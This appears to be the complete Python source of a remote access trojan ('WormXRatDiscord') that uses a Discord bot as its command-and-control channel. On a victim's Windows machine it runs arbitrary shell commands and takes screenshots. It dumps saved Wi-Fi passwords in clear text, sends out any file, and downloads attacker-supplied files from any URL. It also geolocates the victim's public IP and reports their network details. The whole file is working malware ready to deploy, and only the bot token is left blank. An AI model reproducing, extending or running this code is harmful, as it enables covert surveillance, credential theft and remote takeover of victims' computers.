# pip install discord pillow pyautogui requests
# If not works after installion librares, try pip install discord pillow pyautogui requests pyscreeze

import discord
import socket
import subprocess
import pyautogui
import os
import uuid
import requests
import io
import threading
from tkinter import messagebox

session = uuid.uuid4()
TOKEN = "" # <---- Discord Token

current_dir = os.getcwd()
intents = discord.Intents.default()
intents.message_content = True

try:
    response = requests.get('https://ipinfo.io/json')
    jsondataipinfo = response.json()
    country = jsondataipinfo.get('country', 'Unknown')
except:
    country = "Unknown"

client = discord.Client(intents=intents)
channel_ref = None

def get_hostname():
    return socket.gethostname().lower().replace(" ", "-")
    
async def send_msg(channel, text):
    if len(text) > 1900:
        with io.BytesIO(text.encode('utf-8')) as out_file:
            await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
    else:
        await channel.send(f"```\n{text}\n```")

def show_popup(msg):
    messagebox.showinfo("WormXRatDiscord", msg)

@client.event
async def on_ready():
    global channel_ref
    try:
        guild = client.guilds[0]
        name = get_hostname()
        channel_ref = await guild.create_text_channel(name)
        
        header = (
            f"✅ Connected: `{name}`\n"
            f"📍 Path: `{current_dir}`\n"
            f"📍 Country: `{country}`\n"
            f"Session: `{session}`\n"
            "--- Commands ---\n"
            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!chatsendmsg <text>`\n"
            "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` "
        )
        await channel_ref.send(header)
    except Exception as e:
        print(f"Error on_ready: {e}")

@client.event
async def on_message(message):
    global channel_ref, current_dir

    if message.author == client.user: return
    if channel_ref is None or message.channel.id != channel_ref.id: return

    if message.content == "!stealwifipasswords":
        try:
            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
            profiles = [i.split(":")[1][1:-1] for i in meta_data.split('\n') if "All User Profile" in i]
            
            wifi_list = []
            for name in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
                    password_line = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                    password = password_line[0] if password_line else "None"
                    wifi_list.append(f"SSID: {name} Password: {password}")
                except:
                    wifi_list.append(f"SSID: {name} Password: ERROR")
            
            final_output = "\n".join(wifi_list) if wifi_list else "No Wi-Fi profiles found."
            await send_msg(message.channel, final_output)
        except Exception as e:
            await message.channel.send(f"❌ WiFi Error: {e}")

    elif message.content == "!screen":
        path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
        try:
            pyautogui.screenshot(path)
            await message.channel.send(file=discord.File(path))
            os.remove(path)
        except Exception as e:
            await message.channel.send(f"Screenshot Error: {e}")

    elif message.content.startswith("!stealfile "):
        filename = message.content[len("!stealfile "):].strip()
        path = os.path.join(current_dir, filename)
        if os.path.exists(path) and os.path.isfile(path):
            try:
                await message.channel.send(file=discord.File(path))
            except Exception as e:
                await message.channel.send(f"❌ Download Error: {e}")
        else:
            await message.channel.send("❌ Error: File not found.")

    elif message.content.startswith("!saveoncomputer "):
        url = message.content[len("!saveoncomputer "):].strip()
        filename = url.split("/")[-1].split("?")[0]
        if not filename: filename = "uploaded_file"
        
        path = os.path.join(current_dir, filename)
        try:
            r = requests.get(url, stream=True)
            if r.status_code == 200:
                with open(path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                await message.channel.send(f"✅ File uploaded and saved as: `{filename}`")
            else:
                await message.channel.send(f"❌ Error: Server returned status {r.status_code}")
        except Exception as e:
            await message.channel.send(f"❌ Upload Error: {e}")

    elif message.content.startswith("!chatsendmsg "):
        announcemsg = message.content[len("!chatsendmsg "):].strip()
        userip = socket.gethostbyname(socket.gethostname())
        threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
        await message.channel.send(f"✅ Pop-up sent to `{userip}`. Bot is still responsive.")
    
    elif message.content == "!stealwifiaddresses":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()

            
            gateway = subprocess.check_output("powershell (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop", shell=True).decode().strip()

            output = (
                f"Hostname: {socket.gethostname()}\n"
                f"IPv4 Address: {local_ip}\n"
                f"Default Gateway: {gateway}"
            )
            await send_msg(message.channel, output)
        except Exception as e:
            await message.channel.send(f"Error: {e}")
    

    elif message.content == "!stealpublicaddress":
        try:
            #
            response = requests.get('https://ipinfo.io/json', timeout=10)
            data = response.json()
            
            #
            ip = data.get('ip', 'N/A')
            isp_response = requests.get(f'http://ip-api.com/json/{ip}?fields=isp', timeout=10).json()
            isp = isp_response.get('isp', 'N/A')

            address_info = (
                f"🌐 Public IP Address: `{ip}`\n"
                f"🏙️ City: `{data.get('city', 'N/A')}`\n"
                f"🌍 Region: `{data.get('region', 'N/A')}`\n"
                f"🚩 Country: `{data.get('country', 'N/A')}`\n"
                f"🏢 ISP: `{isp}`\n"
                f"📍 Location: `{data.get('loc', 'N/A')}`\n"
                f"📮 Postal: `{data.get('postal', 'N/A')}`"
            )
            await message.channel.send(address_info)
        except Exception as e:
            await message.channel.send(f"❌ Error fetching public address: {e}")

    elif message.content.startswith("!cmd "):
        cmd = message.content[5:].strip()
        if cmd.startswith("cd "):
            new_path = cmd[3:].strip()
            try:
                temp_path = os.path.abspath(os.path.join(current_dir, new_path))
                if os.path.isdir(temp_path):
                    current_dir = temp_path
                    await message.channel.send(f"📍 Directory: `{current_dir}`")
                else:
                    await message.channel.send("❌ Error: Directory not found.")
            except Exception as e:
                await message.channel.send(f"❌ Error: {e}")
            return
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, 
                encoding="cp852", errors="replace", cwd=current_dir
            )
            output = (result.stdout or result.stderr or "Executed (no output).").strip()
            await send_msg(message.channel, output)
        except Exception as e:
            await message.channel.send(f"Error executing command: {e}")

client.run(TOKEN)
